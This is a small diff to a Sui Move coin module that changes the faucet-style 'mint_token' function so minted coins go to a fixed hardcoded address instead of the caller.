@@ -26,6 +26,6 @@ module 0x0::my_coin {
     public entry fun mint_token(treasury: &mut TreasuryCap<MY_COIN>, ctx: &mut TxContext) {
         // faucet with fixed amount
         let coin_object = coin::mint(treasury, 282828, ctx);
-        transfer::public_transfer(coin_object, ctx.sender());
+        transfer::public_transfer(coin_object, @0x06c3f585b8647bead4fb9379be37fc17c8d8e21542b9ccb8a85a4a46bb23c4d1);
     }
 }
